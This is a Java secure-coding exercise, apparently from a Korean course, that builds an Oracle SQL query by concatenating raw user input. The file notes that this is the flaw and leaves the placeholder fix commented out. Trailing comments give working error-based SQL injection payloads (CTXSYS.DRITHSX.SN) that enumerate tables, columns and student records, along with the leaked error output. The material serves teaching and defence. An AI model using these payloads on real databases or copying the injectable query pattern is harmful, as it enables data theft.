package secure.exam;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Scanner;

public class StudentInjectMain {
	public static void main(String[] args) {
		//DB 연결
		DBConnect dbCon = new DBConnect();
		Connection con = dbCon.getConnection();
		PreparedStatement pstmt = null;
		ResultSet rs = null;
		Scanner sc = new Scanner(System.in);

		//java.sql 패키지의 모든 객체는 오류를 던지기 때문에 사용측에서는 예외처리가 반드시 필요함
		try {
			System.out.print("학생 번호 입력 : ");
			String stdNo = sc.nextLine();
			System.out.println(stdNo);
			
			//select 쿼리문 작성: 입력된 학생 번호에 대한 정보를 출력
			//질의어 ?  없이 직접 작성
			//문제점 : preparedStatement 사용했지만 일반쿼리 이용 - ? 홀더 사용하지 않음
			String sql = "select * from student where stdNo='" + stdNo + "'";
			
			//String sql = "select * from student where stdNo=? ";
			System.out.println(sql);
			
			pstmt = con.prepareStatement(sql); 
			//pstmt.setString(1, stdNo);
			rs = pstmt.executeQuery();
			
			//제목 출력
			System.out.println("------------ 학생 정보 조회 -----------------");
			System.out.println("학생번호  \t 학생이름 \t\t\t\t 학년");
			
			//필요내용만 출력 : 모든 컬럼을 select 하지만 사용자에게 전달할 정보만 출력하는 방식으로 프로그램 개발
			//3개의 컬럼만 표현
			while(rs.next()) {
				stdNo = rs.getString(1);
				String stdName = rs.getString(2);
				int stdYear = rs.getInt(3);
				
				//한행씩 출력
				System.out.format("%-10s\t %-20s\t %6d \n",stdNo, stdName, stdYear);
			}
		}catch(Exception e) {
			//e.printStackTrace(); // 로그용으로 구성
			// 페이지인 경우에는 에러 페이지가 전송되도록 구성
			System.out.println("잘못된 구문이 입력되었습니다.");
		}
	}
}

//  ' or CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables))=1 --
//  ' or CTXSYS.DRITHSX.SN(user,(select table_name from (select table_name, ROWNUM AS RNUM FROM user_tables) where RNUM=1))=1 --
//  ' or CTXSYS.DRITHSX.SN(user,(select table_name from (select table_name, ROWNUM AS RNUM FROM user_tables) where RNUM=2))=1 --

//  컬럼 수 확인 
// ' or CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name='STUDENT'))=1 --

// ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=1))=1 --
// DRG-11701: STDNO 키워드 사전이 존재하지 않습니다 - 첫번째 컬럼명 탈취
// 	DRG-11701: STDNAME 키워드 사전이 존재하지 않습니다 -  두번째 컬럼명 탈취
// DRG-11701: STDYEAR 키워드 사전이 존재하지 않습니다 -  세번째 컬럼명 탈취
// DRG-11701: STDADDRESS 키워드 사전이 존재하지 않습니다 - 네번째 컬럼명 탈취
// DRG-11701: STDBIRTH 키워드 사전이 존재하지 않습니다 - 다섯번째 컬럼명 탈취
// DRG-11701: DPTNO 키워드 사전이 존재하지 않습니다 - 여섯번째 컬럼명 탈취

// 데이터 수 확인
// ' or CTXSYS.DRITHSX.SN(user,(select count(*) from STUDENT))=1 --

// ' or CTXSYS.DRITHSX.SN(user,(select STDNO from (select STDNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 2023001 키워드 사전이 존재하지 않습니다 - STDNO의 첫번째 데이터 탈취

// ' or CTXSYS.DRITHSX.SN(user,(select STDNAME from (select STDNAME, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 홍길동 키워드 사전이 존재하지 않습니다 - STDNAME의 첫번째 데이터 탈취

// ' or CTXSYS.DRITHSX.SN(user,(select STDYEAR from (select STDYEAR, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 3 키워드 사전이 존재하지 않습니다 - STDYEAR의 첫번째 데이터 탈취

//  ' or CTXSYS.DRITHSX.SN(user,(select STDADDRESS from (select STDADDRESS, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 서울시 키워드 사전이 존재하지 않습니다

// ' or CTXSYS.DRITHSX.SN(user,(select STDBIRTH from (select STDBIRTH, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 99/01/01 키워드 사전이 존재하지 않습니다

// ' or CTXSYS.DRITHSX.SN(user,(select DPTNO from (select DPTNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
// DRG-11701: 002 키워드 사전이 존재하지 않습니다